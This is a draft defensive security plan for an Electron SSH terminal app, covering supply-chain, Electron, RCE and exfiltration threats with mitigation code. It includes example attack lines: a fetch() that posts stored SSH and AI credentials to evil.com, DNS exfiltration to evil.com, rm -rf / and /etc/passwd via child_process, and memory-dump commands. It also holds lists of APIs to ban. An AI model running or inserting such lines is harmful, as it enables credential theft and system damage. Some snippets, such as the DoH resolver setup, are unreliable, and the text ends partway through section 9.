# App Defense Plan — Protecting Carbon Against Takeover & Data Theft

> **Document version:** 0.1-draft
> **Author:** Security Architecture
> **Last updated:** 2026-05-08
> **Status:** Pre-implementation planning
> **Product:** Carbon — AI-powered SSH terminal platform

---

## Table of Contents

1. [Threat Landscape](#1-threat-landscape)
2. [Supply Chain Attacks (npm Packages)](#2-supply-chain-attacks-npm-packages)
3. [OS-Level Threats](#3-os-level-threats)
4. [Electron-Specific Attack Vectors](#4-electron-specific-attack-vectors)
5. [Remote Code Execution (RCE)](#5-remote-code-execution-rce)
6. [Data Exfiltration & Credential Theft](#6-data-exfiltration--credential-theft)
7. [App Takeover & Privilege Escalation](#7-app-takeover--privilege-escalation)
8. [Network-Level Attacks](#8-network-level-attacks)
9. [Build & Distribution Pipeline Security](#9-build--distribution-pipeline-security)
10. [Memory & Runtime Attacks](#10-memory--runtime-attacks)
11. [Defense Implementation Roadmap](#11-defense-implementation-roadmap)
12. [Incident Response Plan](#12-incident-response-plan)

---

## 1. Threat Landscape

### Why Carbon Is a High-Value Target

Carbon holds the keys to production servers. A compromise of Carbon means:

- **Full SSH access to every server the user has configured** — passwords, private keys, passphrases
- **AI API keys** — OpenAI, Anthropic, or other provider credentials
- **Terminal history** — commands, outputs, environment variables, database queries
- **Server infrastructure map** — hostnames, ports, usernames, network topology
- **App lock credentials** — biometric bypass or password hash

An attacker who compromises Carbon doesn't need to hack the servers directly — they already have the credentials to walk in the front door.

### Attacker Profiles

| Attacker | Goal | Method | Likelihood |
|----------|------|--------|------------|
| **Supply chain attacker** | Steal SSH keys/passwords from all Carbon users | Poison an npm dependency with data exfil payload | High |
| **Local malware** | Harvest credentials from the machine | Read localStorage/SQLite files, dump process memory | High |
| **Targeted attacker** | Compromise a specific org's servers | Trojanized Carbon build, phishing for app data | Medium |
| **Browser extension / Electron exploit** | Execute arbitrary code in renderer | XSS, prototype pollution, compromised extension | Medium |
| **Network attacker** | Intercept credentials in transit | MITM on local WebSocket, DNS hijack for API calls | Low-Medium |
| **Insider threat** | Exfiltrate codebase or inject backdoor | Commit malicious code, tamper with build pipeline | Low |

### What We're Protecting

| Asset | Sensitivity | Current Storage | Risk Level |
|-------|------------|-----------------|------------|
| SSH passwords | **Critical** | localStorage (encrypted via safeStorage) | High |
| SSH private keys | **Critical** | localStorage (encrypted via safeStorage) | High |
| SSH passphrases | **Critical** | localStorage (encrypted via safeStorage) | High |
| AI API keys | **Critical** | localStorage (plaintext JSON) | Critical |
| App lock password | **Critical** | localStorage (plaintext) | Critical |
| Connection metadata (hosts, ports, usernames) | **High** | localStorage (encrypted blob) | Medium |
| Terminal command history | **High** | In-memory + SQLite | Medium |
| Terminal output buffer | **High** | In-memory (xterm.js) | Medium |
| App settings & preferences | **Low** | localStorage | Low |

---

## 2. Supply Chain Attacks (npm Packages)

### The Threat

npm supply chain attacks are the single most likely and most dangerous vector for compromising Carbon. A single poisoned dependency can:

- Exfiltrate all credentials from localStorage/memory on app start
- Install a persistent backdoor in the Electron main process
- Replace SSH connection logic to proxy all sessions through an attacker's server
- Inject a keylogger that captures every keystroke in the terminal

### Real-World Precedents

| Incident | Year | What Happened | Impact |
|----------|------|---------------|--------|
| **event-stream** | 2018 | Maintainer transferred ownership; new owner injected crypto-stealing code targeting a Bitcoin wallet app | Targeted data theft from a specific Electron app |
| **ua-parser-js** | 2021 | Popular package (8M downloads/week) hijacked; cryptominer + credential stealer injected | All consumers infected for 4 hours |
| **colors + faker** | 2022 | Maintainer self-sabotaged; infinite loop injected | All consumers broken |
| **node-ipc** | 2022 | Maintainer added "protestware" that wiped files on Russian/Belarusian IPs | Targeted data destruction |
| **lottie-player** | 2024 | npm account compromise; crypto wallet drainer injected into popular animation library | Front-end injection affecting downstream apps |

### Attack Vectors in Carbon's Dependency Tree

#### 2.1 Direct Dependencies

Every package in `package.json` is a trust relationship. Risks:

- **Maintainer account compromise** — attacker publishes a poisoned patch version
- **Typosquatting** — a dependency with a similar name to a real one gets installed by mistake
- **Maintainer goes rogue** — a trusted maintainer intentionally injects malicious code
- **Dependency confusion** — private package name collision with a public package

#### 2.2 Transitive Dependencies

Carbon's `node_modules` contains hundreds of packages. Most are transitive (dependencies of dependencies). A vulnerability in any of them can compromise the entire app.

#### 2.3 Install Scripts

npm packages can run arbitrary code during `npm install` / `pnpm install` via:

- `preinstall` scripts
- `postinstall` scripts
- `prepare` scripts
- Native addon compilation (`node-gyp rebuild`)

These scripts execute with the full privileges of the user running the install. They can:

- Read/write any file the user can access
- Make network requests
- Install persistent malware
- Modify other packages in `node_modules`

#### 2.4 Build-Time Code Execution

Webpack/Next.js plugins, Babel transforms, PostCSS plugins — all execute during build with full Node.js access. A compromised build plugin can:

- Inject code into the final bundle
- Exfiltrate environment variables (which may contain secrets)
- Modify the Electron main process code

### Defenses

#### D2.1: Lock Dependencies with Exact Versions

```
# .npmrc
save-exact=true
```

Never use `^` or `~` ranges. Pin every dependency to an exact version. This prevents silent upgrades when a maintainer publishes a compromised patch.

**Current state:** Check `.npmrc` and `package.json` for version ranges.

#### D2.2: Use pnpm with Strict Settings

pnpm already provides better isolation than npm/yarn:

```
# .npmrc
strict-peer-dependencies=true
auto-install-peers=false
shamefully-hoist=false
```

`shamefully-hoist=false` prevents packages from accessing dependencies they didn't declare — limiting the blast radius of a compromised package.

#### D2.3: Disable Install Scripts for Untrusted Packages

```
# .npmrc
ignore-scripts=true
```

Then explicitly allow install scripts only for packages that need them:

```
# .npmrc
# Only these packages are allowed to run install scripts
allow-scripts=electron,better-sqlite3,@electron/rebuild
```

Or use pnpm's `onlyBuiltDependencies` in `package.json`:

```json
{
  "pnpm": {
    "onlyBuiltDependencies": [
      "electron",
      "better-sqlite3"
    ]
  }
}
```

This blocks the most common supply chain attack vector — malicious install scripts.

#### D2.4: Audit Dependencies Regularly

Automated:

```bash
# Run on every CI build
pnpm audit --audit-level=high

# Use Socket.dev for deeper supply chain analysis
npx socket scan
```

Manual (monthly):

1. Review all direct dependency updates since last audit
2. Check for maintainer changes on critical packages
3. Review any new transitive dependencies introduced by updates
4. Check for packages with abnormally low download counts or recent ownership transfers

#### D2.5: Use a Lockfile and Verify It

The `pnpm-lock.yaml` file pins exact versions and integrity hashes. **Never ignore lockfile changes in code review.**

```bash
# Verify lockfile integrity
pnpm install --frozen-lockfile
```

In CI, always use `--frozen-lockfile` to ensure the lockfile hasn't been tampered with.

#### D2.6: Monitor for Compromised Packages

- **Socket.dev** — Real-time supply chain threat detection. Alerts on suspicious package behavior (network access in install scripts, obfuscated code, etc.)
- **Snyk** — Vulnerability scanning for known CVEs
- **npm audit signatures** — Verify that published packages match the registry's signing key

#### D2.7: Vendor Critical Dependencies (Nuclear Option)

For the most security-critical packages (SSH library, crypto libraries), consider vendoring:

1. Fork the package into a private repo
2. Pin to a specific reviewed commit
3. Build from source in CI
4. Only update after manual code review

This is extreme but appropriate for packages that handle SSH credentials directly.

#### D2.8: Subresource Integrity for CDN Assets

If any JavaScript is loaded from a CDN (unlikely in Electron but worth checking):

```html
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-..."
        crossorigin="anonymous"></script>
```

#### D2.9: Runtime Package Behavior Monitoring

Implement a runtime sandbox or monitoring layer that detects when a package does something unexpected:

- Makes outbound HTTP requests from the main process
- Reads files outside its expected scope
- Accesses `process.env`
- Spawns child processes

This can be done with:

- **Node.js `--experimental-permission`** flag (Node 20+) — restrict fs/net access
- Custom `require()` hook that logs unusual module loads
- Electron's `app.on('child-process-gone')` for unexpected subprocess activity

---

## 3. OS-Level Threats

### The Threat

If the user's operating system is compromised, Carbon's defenses are limited. But we can still make data extraction harder and detect compromise.

### Attack Vectors

#### 3.1 Filesystem Access to App Data

| Location | Contents | Risk |
|----------|----------|------|
| `%APPDATA%/carbon-ssh/` (Windows) | localStorage LevelDB, SQLite logs, settings | Any local process can read |
| `~/Library/Application Support/carbon-ssh/` (macOS) | Same | Same |
| `~/.config/carbon-ssh/` (Linux) | Same | Same |
| `%TEMP%/` or `/tmp/` | Dev mode SQLite database | World-readable on some systems |

An attacker with local filesystem access can:

- Copy the localStorage database and decrypt it offline (if using safeStorage, the key is tied to the OS user, but if using base64 fallback, it's trivially readable)
- Read the SQLite log database for command history, hostnames, usernames
- Read crash dumps or core dumps that may contain secrets in memory

#### 3.2 Process Memory Dumping

Any process running as the same user can dump Carbon's memory:

```bash
# Linux
gcore <pid>

# Windows
procdump -ma <pid>

# macOS
lldb -p <pid> -o "process save-core core.dump"
```

The memory dump will contain:

- All JavaScript objects (including passwords, private keys in strings)
- Decrypted localStorage values
- Terminal output buffers
- HTTP request/response bodies (including AI API calls with keys)

#### 3.3 Keyloggers

A system-level keylogger captures every keystroke, including:

- Passwords typed into the Carbon connection form
- Commands typed in the terminal (including `mysql -p'secret'`)
- App lock password

#### 3.4 Clipboard Hijacking

If the user copies a private key or password, clipboard malware can:

- Read the clipboard contents
- Replace clipboard contents (e.g., swap an SSH key with an attacker's key)

#### 3.5 Screen Capture

Malware can screenshot or screen-record Carbon showing:

- Connection details
- Terminal output with sensitive data
- Settings panels with API keys

### Defenses

#### D3.1: Restrict File Permissions on App Data

On app startup, verify and set restrictive permissions on the app data directory:

```javascript
// Electron main process — on app ready
const appDataPath = app.getPath('userData');
if (process.platform !== 'win32') {
  fs.chmodSync(appDataPath, 0o700);
}
// Windows: set ACL to restrict to current user only
```

#### D3.2: Never Use the base64 Fallback for Encryption

As documented in `security-improvements.md` Finding #2 — if `safeStorage` is unavailable, refuse to persist secrets. Show a warning and require re-entry each session.

#### D3.3: Minimize Secret Lifetime in Memory

1. Fetch secrets from the keychain only when needed (at SSH connect time)
2. After use, overwrite the string variable with empty string
3. For `Buffer` objects, use `.fill(0)` to zero out
4. Set connection passwords to `undefined` in state after the SSH session is established
5. Never keep secrets in React state longer than the form is open

```typescript
// After SSH connection is established
connectionRef.current.password = undefined;
connectionRef.current.privateKey = undefined;
connectionRef.current.passphrase = undefined;
```

Note: JavaScript string immutability means we can't truly zero strings. This is a defense-in-depth measure, not a guarantee.

#### D3.4: Detect Debugger Attachment

In production builds, detect when a debugger is attached:

```javascript
// Main process
const isDebuggerAttached = () => {
  return process.debugPort !== 0 ||
    /--inspect|--debug/.test(process.execArgv.join(' '));
};

if (isDebuggerAttached() && !isDev) {
  app.quit();
}
```

For the renderer process:

```javascript
// Disable DevTools in production
if (!isDev) {
  mainWindow.webContents.on('devtools-opened', () => {
    mainWindow.webContents.closeDevTools();
  });
}
```

#### D3.5: Prevent Core Dumps

On Linux, disable core dumps for the Carbon process:

```javascript
// Main process
if (process.platform === 'linux') {
  const { execSync } = require('child_process');
  try {
    execSync(`prlimit --pid ${process.pid} --core=0:0`);
  } catch (e) {
    // Best effort
  }
}
```

#### D3.6: Clipboard Protection

When copying sensitive data (if ever necessary):

1. Clear the clipboard after a timeout (30 seconds)
2. Use Electron's `clipboard.writeText()` and schedule `clipboard.clear()`
3. Never auto-copy passwords or private keys

```javascript
function secureCopy(text, clearAfterMs = 30000) {
  clipboard.writeText(text);
  setTimeout(() => {
    if (clipboard.readText() === text) {
      clipboard.clear();
    }
  }, clearAfterMs);
}
```

#### D3.7: Integrity Checking on Startup

Verify that Carbon's own binaries haven't been tampered with:

```javascript
// On app startup, verify critical files against known hashes
const EXPECTED_HASHES = {
  'main.cjs': 'sha256-...',
  'preload.cjs': 'sha256-...',
};

for (const [file, expectedHash] of Object.entries(EXPECTED_HASHES)) {
  const actualHash = crypto
    .createHash('sha256')
    .update(fs.readFileSync(path.join(__dirname, file)))
    .digest('hex');
  if (actualHash !== `sha256-${expectedHash}`) {
    dialog.showErrorBox(
      'Integrity Check Failed',
      `Carbon's files have been modified. This may indicate tampering.\n\nFile: ${file}`
    );
    app.quit();
  }
}
```

---

## 4. Electron-Specific Attack Vectors

### The Threat

Electron apps have a unique attack surface because they combine a Node.js backend (main process) with a Chromium browser (renderer process). Misconfigurations can give web content full system access.

### Attack Vectors

#### 4.1 nodeIntegration in Renderer

If `nodeIntegration: true` is set in the renderer, any JavaScript in the renderer (including XSS payloads, injected scripts from compromised npm packages, or content loaded from remote URLs) can:

- `require('child_process').exec('rm -rf /')` — execute arbitrary system commands
- `require('fs').readFileSync('/etc/passwd')` — read any file
- Access all Electron APIs directly

#### 4.2 contextIsolation Disabled

If `contextIsolation: false`, the preload script shares the JavaScript context with web content. An attacker can:

- Modify prototypes to intercept IPC calls
- Override `window.electron` functions to capture credentials
- Inject code that runs with preload privileges

#### 4.3 Remote Content Loading

If the Electron app loads remote web pages, those pages inherit whatever privileges the renderer has. An attacker who controls a loaded URL can execute code in the app context.

#### 4.4 Protocol Handler Hijacking

Custom protocol handlers (e.g., `carbon-ssh://`) can be registered by the app. If not properly validated, a malicious URL can trigger actions in the app:

```
carbon-ssh://connect?host=evil.com&password=stolen
```

#### 4.5 Preload Script Exposure

If the preload script exposes too many IPC channels or wraps too many main process APIs, it becomes a bridge for the renderer to do dangerous things.

#### 4.6 WebView / iframe Injection

If the app uses `<webview>` tags or loads untrusted content in iframes, the embedded content may escape its sandbox.

### Defenses

#### D4.1: Verify Electron Security Configuration

The BrowserWindow must have these settings. Verify they are set and add runtime assertions:

```javascript
const mainWindow = new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,          // CRITICAL
    contextIsolation: true,          // CRITICAL
    sandbox: true,                   // IMPORTANT
    webSecurity: true,               // IMPORTANT — enforces same-origin
    allowRunningInsecureContent: false,
    experimentalFeatures: false,
    enableBlinkFeatures: '',         // No experimental Blink features
    preload: path.join(__dirname, 'preload.cjs'),
  },
});
```

Add a startup assertion:

```javascript
app.on('web-contents-created', (event, contents) => {
  // Verify security settings on every web contents
  const prefs = contents.getWebPreferences();
  if (prefs.nodeIntegration || !prefs.contextIsolation) {
    console.error('SECURITY VIOLATION: Insecure web preferences detected');
    app.quit();
  }
});
```

#### D4.2: Restrict Navigation

Prevent the renderer from navigating to unexpected URLs:

```javascript
app.on('web-contents-created', (event, contents) => {
  contents.on('will-navigate', (event, navigationUrl) => {
    const parsedUrl = new URL(navigationUrl);
    // Only allow navigation to our own app
    if (parsedUrl.origin !== 'http://localhost:PORT') {
      event.preventDefault();
    }
  });

  // Block new window creation
  contents.setWindowOpenHandler(({ url }) => {
    // Open external links in the system browser
    if (url.startsWith('https://')) {
      shell.openExternal(url);
    }
    return { action: 'deny' };
  });
});
```

#### D4.3: Minimal Preload API Surface

The preload script should expose the absolute minimum IPC surface. Audit every exposed function:

```javascript
// preload.cjs — ONLY these functions should be exposed
contextBridge.exposeInMainWorld('electron', {
  // Encryption (no raw crypto access)
  encryptString: (text) => ipcRenderer.invoke('encrypt-string', text),
  decryptString: (text) => ipcRenderer.invoke('decrypt-string', text),

  // Biometric (returns boolean, no system access)
  biometricUnlock: (reason) => ipcRenderer.invoke('biometric-unlock', reason),

  // App info (read-only)
  getVersion: () => ipcRenderer.invoke('get-version'),
  getPlatform: () => process.platform,

  // File dialogs (user-initiated only)
  openFileDialog: (opts) => ipcRenderer.invoke('open-file-dialog', opts),
});
```

**Never expose:**

- `ipcRenderer.send` or `ipcRenderer.on` directly (allows arbitrary IPC)
- `require` or `process` (gives full Node.js access)
- `shell.openExternal` without URL validation (allows opening arbitrary executables)
- File system read/write without strict path validation

#### D4.4: Content Security Policy (CSP)

Set a strict CSP in the HTML or via HTTP headers:

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self';
               style-src 'self' 'unsafe-inline';
               connect-src 'self' ws://localhost:* wss://localhost:*;
               img-src 'self' data:;
               font-src 'self';
               object-src 'none';
               base-uri 'self';
               form-action 'none';
               frame-ancestors 'none';">
```

Key restrictions:

- `script-src 'self'` — no inline scripts, no `eval()`, no remote scripts
- `connect-src 'self' ws://localhost:*` — only connect to our own servers
- `object-src 'none'` — no plugins (Flash, Java, etc.)
- `frame-ancestors 'none'` — prevent embedding in iframes

#### D4.5: Disable Remote Module

The remote module (deprecated but still available) gives the renderer full access to the main process:

```javascript
// Already the default in modern Electron, but verify:
webPreferences: {
  enableRemoteModule: false,
}
```

#### D4.6: IPC Channel Validation

Every IPC handler in the main process must validate its inputs:

```javascript
ipcMain.handle('encrypt-string', (event, text) => {
  // Validate input type
  if (typeof text !== 'string') {
    throw new Error('Invalid input: expected string');
  }
  // Validate input length (prevent memory exhaustion)
  if (text.length > 10 * 1024 * 1024) { // 10MB max
    throw new Error('Input too large');
  }
  // Validate sender is our window
  if (event.sender.id !== mainWindow.webContents.id) {
    throw new Error('Unauthorized sender');
  }

  return safeStorage.encryptString(text).toString('base64');
});
```

#### D4.7: Fuses (Electron Fuses)

Electron Fuses are compile-time flags that permanently disable dangerous features:

```javascript
// In electron-builder config or via @electron/fuses
const { FuseV1Options, FuseVersion } = require('@electron/fuses');

flipFuses(electronPath, {
  version: FuseVersion.V1,
  [FuseV1Options.RunAsNode]: false,              // Prevent ELECTRON_RUN_AS_NODE
  [FuseV1Options.EnableCookieEncryption]: true,   // Encrypt cookies
  [FuseV1Options.EnableNodeOptionsEnvironmentVariable]: false, // Block NODE_OPTIONS
  [FuseV1Options.EnableNodeCliInspectArguments]: false,       // Block --inspect
  [FuseV1Options.EnableEmbeddedAsarIntegrityValidation]: true, // Verify asar integrity
  [FuseV1Options.OnlyLoadAppFromAsar]: true,      // Only load from asar (prevents code injection)
});
```

Critical fuses:

- **`RunAsNode: false`** — prevents `ELECTRON_RUN_AS_NODE=1` which turns the Electron binary into a full Node.js runtime, bypassing all Electron security
- **`OnlyLoadAppFromAsar: true`** — prevents loading app code from loose files (which an attacker could modify)
- **`EnableNodeOptionsEnvironmentVariable: false`** — prevents `NODE_OPTIONS=--require=malicious.js`
- **`EnableNodeCliInspectArguments: false`** — prevents remote debugging in production

---

## 5. Remote Code Execution (RCE)

### The Threat

RCE means an attacker can execute arbitrary code on the user's machine through Carbon. This is the worst-case scenario.

### Attack Vectors

#### 5.1 Prototype Pollution

JavaScript prototype pollution can lead to RCE in Node.js/Electron. If an attacker can pollute `Object.prototype`, they can:

- Inject properties into `child_process.spawn` options
- Override `require` resolution
- Modify process environment variables

Common entry points:

- Deep merge utilities (lodash `_.merge`, `deepmerge`)
- JSON parsing of untrusted input
- Query string parsing

#### 5.2 Unsafe Deserialization

If any part of Carbon deserializes untrusted data (JSON.parse of WebSocket messages, IPC payloads), a crafted payload can trigger unexpected behavior.

#### 5.3 Command Injection

If user input is ever concatenated into a shell command:

```javascript
// DANGEROUS — never do this
exec(`ssh ${userInput}@${host}`);
```

#### 5.4 Template Injection

If user-controlled strings are passed to template engines or `eval()`-like constructs.

#### 5.5 Dependency Vulnerabilities

Known RCE vulnerabilities in dependencies (e.g., a vulnerable version of a Markdown renderer, image parser, or protocol library).

### Defenses

#### D5.1: Freeze Prototypes

At the very start of both main and renderer processes:

```javascript
// Prevent prototype pollution
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Function.prototype);
Object.freeze(String.prototype);
Object.freeze(Number.prototype);
Object.freeze(Boolean.prototype);
```

Note: This can break some libraries that extend prototypes. Test thoroughly.

#### D5.2: Never Construct Shell Commands from User Input

All SSH connections must use the ssh2 library's programmatic API, never shell commands:

```javascript
// CORRECT — programmatic API
sshClient.connect({
  host: connection.host,
  port: connection.port,
  username: connection.username,
  password: connection.password,
});

// NEVER — shell command construction
exec(`ssh ${connection.username}@${connection.host}`);
```

Audit the entire codebase for `child_process.exec`, `child_process.execSync`, `child_process.spawn` with `shell: true`, and `eval()`.

#### D5.3: Validate All IPC and WebSocket Payloads

Every message received over IPC or WebSocket must be validated against a schema:

```typescript
import { z } from 'zod';

const ConnectMessageSchema = z.object({
  type: z.literal('connect'),
  data: z.object({
    host: z.string().max(255).regex(/^[a-zA-Z0-9._-]+$/),
    port: z.number().int().min(1).max(65535),
    username: z.string().max(64),
    authType: z.enum(['password', 'key']),
  }),
});

// In WebSocket handler
const parsed = ConnectMessageSchema.safeParse(JSON.parse(rawMessage));
if (!parsed.success) {
  ws.close(4000, 'Invalid message format');
  return;
}
```

#### D5.4: Dependency Vulnerability Scanning in CI

```yaml
# GitHub Actions
- name: Security audit
  run: |
    pnpm audit --audit-level=high
    npx better-npm-audit audit --level high
```

Block merges if high/critical vulnerabilities are found.

#### D5.5: Ban Dangerous APIs

Create an ESLint rule or pre-commit hook that blocks:

```
eval()
new Function()
child_process.exec (prefer execFile with no shell)
child_process.spawn with { shell: true }
document.write()
innerHTML with user content
setTimeout/setInterval with string arguments
```

---

## 6. Data Exfiltration & Credential Theft

### The Threat

An attacker who has code execution in Carbon (via supply chain, XSS, or compromised dependency) wants to steal credentials and send them to an external server.

### Attack Vectors

#### 6.1 Network Exfiltration

Malicious code makes HTTP/DNS/WebSocket requests to an attacker-controlled server, sending credentials:

```javascript
// What a supply chain attacker might inject
fetch('https://evil.com/collect', {
  method: 'POST',
  body: JSON.stringify({
    connections: localStorage.getItem('ssh.connections'),
    aiKeys: localStorage.getItem('ssh.ai-settings'),
  }),
});
```

#### 6.2 DNS Exfiltration

Even if HTTP is blocked, data can be exfiltrated via DNS queries:

```javascript
// Encode data in DNS lookups
const encoded = Buffer.from(secret).toString('hex');
dns.resolve(`${encoded}.evil.com`);
```

#### 6.3 Filesystem Exfiltration

Write credentials to a temp file that another malware process reads:

```javascript
fs.writeFileSync('/tmp/.hidden', JSON.stringify(credentials));
```

#### 6.4 Clipboard Exfiltration

Copy credentials to clipboard where clipboard monitoring malware captures them.

### Defenses

#### D6.1: Network Egress Filtering

In the main process, intercept and filter all outbound requests:

```javascript
const { session } = require('electron');

session.defaultSession.webRequest.onBeforeRequest(
  { urls: ['*://*/*'] },
  (details, callback) => {
    const url = new URL(details.url);

    // Allowlist of permitted domains
    const ALLOWED_ORIGINS = new Set([
      'localhost',
      '127.0.0.1',
      'api.openai.com',
      'api.anthropic.com',
      // Add other legitimate AI providers
    ]);

    if (!ALLOWED_ORIGINS.has(url.hostname)) {
      console.warn(`Blocked outbound request to: ${url.hostname}`);
      callback({ cancel: true });
      return;
    }

    callback({});
  }
);
```

This is the single most effective defense against supply chain data exfiltration. A compromised package can execute code, but it can't phone home.

#### D6.2: CSP connect-src Restriction

The Content Security Policy (Section 4.4) must restrict `connect-src` to only allowed origins:

```
connect-src 'self' ws://localhost:* https://api.openai.com https://api.anthropic.com;
```

#### D6.3: Monitor for Anomalous Network Activity

Log all outbound connections from the main process. Alert if a connection is made to an unexpected destination:

```javascript
const net = require('net');
const originalConnect = net.Socket.prototype.connect;

net.Socket.prototype.connect = function (...args) {
  const destination = args[0];
  if (typeof destination === 'object' && destination.host) {
    if (!isAllowedHost(destination.host)) {
      console.error(`SECURITY: Unexpected outbound connection to ${destination.host}`);
      // Optionally block
      return;
    }
  }
  return originalConnect.apply(this, args);
};
```

#### D6.4: Encrypt All Data at Rest

Even if an attacker can read files, encrypted data is useless without the key:

1. **All credentials** — system keychain (OS-protected)
2. **SQLite logs** — SQLCipher or safeStorage-wrapped encryption key
3. **localStorage** — safeStorage encryption (no base64 fallback)
4. **Temp files** — never write secrets to temp files

#### D6.5: Credential Access Audit Log

Log every access to credentials (even successful ones):

```typescript
function getCredentialFromKeychain(connectionId: string): string {
  auditLog.write({
    event: 'credential_access',
    connectionId,
    timestamp: Date.now(),
    caller: new Error().stack, // capture call stack
  });
  return keychain.get(connectionId);
}
```

This creates a forensic trail if credentials are accessed by malicious code.

---

## 7. App Takeover & Privilege Escalation

### The Threat

An attacker gains control of Carbon's execution flow to:

- Modify what the user sees (show fake terminal output, hide malicious commands)
- Inject commands into active SSH sessions
- Escalate from renderer to main process (which has full Node.js/system access)

### Attack Vectors

#### 7.1 Renderer-to-Main Escalation

If the renderer is compromised (XSS, poisoned dependency), the attacker tries to reach the main process via IPC:

- Abuse exposed IPC channels to execute privileged operations
- Exploit IPC handlers that don't validate input
- Use `webContents.executeJavaScript()` if accessible

#### 7.2 SSH Session Hijacking

An attacker with code execution in the renderer can:

- Send commands through the WebSocket to active SSH sessions
- Read terminal output (which may contain secrets)
- Modify the terminal display to hide their activity

#### 7.3 Auto-Update Hijacking

If Carbon has an auto-update mechanism, an attacker who controls the update server (or performs MITM) can push a malicious update:

- Replace the app binary with a trojanized version
- The user trusts the update because it comes from the "official" update channel

#### 7.4 DLL/dylib Hijacking

On Windows, if Carbon loads DLLs from insecure locations, an attacker can place a malicious DLL that gets loaded instead:

- Place `node.dll` or `electron.dll` in the app's working directory
- On macOS, similar with dylib injection via `DYLD_INSERT_LIBRARIES`

### Defenses

#### D7.1: IPC Channel Lockdown

Limit IPC to a fixed set of named channels. Reject any IPC message on an unknown channel:

```javascript
const ALLOWED_IPC_CHANNELS = new Set([
  'encrypt-string',
  'decrypt-string',
  'biometric-unlock',
  'get-version',
  'open-file-dialog',
]);

ipcMain.handle = new Proxy(ipcMain.handle, {
  apply(target, thisArg, args) {
    const [channel] = args;
    if (!ALLOWED_IPC_CHANNELS.has(channel)) {
      throw new Error(`Unauthorized IPC channel: ${channel}`);
    }
    return Reflect.apply(target, thisArg, args);
  },
});
```

#### D7.2: WebSocket Session Tokens

As noted in `security-improvements.md` Finding #11 — add authentication to the WebSocket:

1. Generate a cryptographically random token at app startup
2. Pass it to the renderer via the preload script
3. Require it on every WebSocket connection and message
4. Rotate the token periodically

```javascript
// Main process
const wsToken = crypto.randomBytes(32).toString('hex');

// Preload
contextBridge.exposeInMainWorld('electron', {
  getWsToken: () => wsToken,
});

// WebSocket handler
wss.on('connection', (ws, req) => {
  const url = new URL(req.url, 'http://localhost');
  if (url.searchParams.get('token') !== wsToken) {
    ws.close(4001, 'Unauthorized');
    return;
  }
});
```

#### D7.3: Code Signing & Auto-Update Verification

1. **Sign all releases** with a code signing certificate (Apple Developer ID for macOS, EV certificate for Windows)
2. **Use electron-updater with signature verification** — updates must be signed with the same key
3. **Pin the update server URL** — don't allow it to be overridden by environment variables
4. **HTTPS-only for update checks** — with certificate pinning if feasible

```javascript
// electron-builder.yml
publish:
  provider: github
  owner: your-org
  repo: carbon-ssh

// Auto-updater in main process
autoUpdater.on('update-downloaded', (info) => {
  // Verify the update signature before installing
  if (!verifyUpdateSignature(info)) {
    console.error('Update signature verification failed');
    return;
  }
});
```

#### D7.4: Prevent DLL/dylib Hijacking

On Windows:

```javascript
// Set DLL search order to exclude current directory
if (process.platform === 'win32') {
  // Use SetDllDirectory to remove current directory from search path
  // This should be done in the native layer or via electron-builder config
}
```

In `electron-builder.yml`, use ASAR packaging (which prevents loose file manipulation):

```yaml
asar: true
asarUnpack:
  - "**/*.node"  # Only unpack native addons
```

On macOS, the app should be hardened with:

```
com.apple.security.cs.disable-library-validation = false
```

#### D7.5: Runtime Integrity Monitoring

Periodically verify that critical functions haven't been monkey-patched:

```javascript
// Store references to critical functions at startup
const _originalFetch = globalThis.fetch;
const _originalXHR = XMLHttpRequest.prototype.open;

setInterval(() => {
  if (globalThis.fetch !== _originalFetch) {
    console.error('SECURITY: fetch() has been monkey-patched');
    // Alert and/or quit
  }
}, 30000);
```

---

## 8. Network-Level Attacks

### The Threat

Network attacks target credentials and data in transit between Carbon's components or between Carbon and external services.

### Attack Vectors

#### 8.1 Local WebSocket Interception

Carbon's WebSocket server listens on localhost. While localhost traffic doesn't leave the machine, other local processes can connect to it.

#### 8.2 MITM on AI API Calls

If Carbon makes HTTPS calls to AI providers (OpenAI, Anthropic), a network attacker could:

- Present a fraudulent TLS certificate (if certificate validation is weak)
- Use DNS spoofing to redirect API calls
- Intercept API keys and prompts (which may include server context)

#### 8.3 SSH Connection MITM

As documented in `security-improvements.md` Finding #6 — host key verification is disabled (`hostVerifier: () => true`). An attacker can intercept SSH connections and present their own key.

#### 8.4 Update Channel MITM

If the auto-update mechanism doesn't verify signatures, an attacker can serve a malicious update over a compromised network.

### Defenses

#### D8.1: WebSocket Binding and Authentication

1. **Bind to 127.0.0.1 only** (already done)
2. **Add token-based authentication** (Section 7.2)
3. **Use a random port** — don't use a predictable port that other processes can target
4. **Consider using Unix domain sockets** (Linux/macOS) or named pipes (Windows) instead of TCP, which restricts access to the same user

#### D8.2: Certificate Pinning for API Calls

Pin TLS certificates for known API providers:

```javascript
const https = require('https');

const PINNED_CERTS = {
  'api.openai.com': ['sha256/...'],
  'api.anthropic.com': ['sha256/...'],
};

// Use a custom HTTPS agent that verifies pins
const agent = new https.Agent({
  checkServerIdentity: (hostname, cert) => {
    const pins = PINNED_CERTS[hostname];
    if (pins) {
      const fingerprint = crypto
        .createHash('sha256')
        .update(cert.raw)
        .digest('base64');
      if (!pins.includes(`sha256/${fingerprint}`)) {
        throw new Error(`Certificate pinning failed for ${hostname}`);
      }
    }
  },
});
```

#### D8.3: SSH Host Key Verification

Implement proper known_hosts management as described in `security-improvements.md` Finding #6. This is one of the highest-priority fixes.

#### D8.4: DNS-over-HTTPS (DoH) for Critical Lookups

For AI API calls and update checks, use DNS-over-HTTPS to prevent DNS spoofing:

```javascript
// Use a DoH resolver for critical hostname lookups
const { Resolver } = require('dns').promises;
const resolver = new Resolver();
resolver.setServers(['https://1.1.1.1/dns-query']);
```

---

## 9. Build & Distribution Pipeline Security

### The Threat

If the build pipeline is compromised, every user receives a trojaned app. This is the ultimate supply chain attack.

### Attack Vectors

#### 9.1 CI/CD Compromise

- GitHub Actions runner compromise
- Stolen deployment secrets (code signing keys, publish tokens)
- Malicious pull requests that modify the build pipeline
- GitHub Actions supply chain (compromised action from the marketplace)

#### 9.2 Build Environment Poisoning

- Compromised build machine
- Malicious environment variables
- DNS hijack during `pnpm install` in CI

#### 9.3 Distribution Tampering

- Compromise of the download server / GitHub Releases
- Publish malicious release from a stolen maintainer account
- CDN cache poisoning

### Defenses

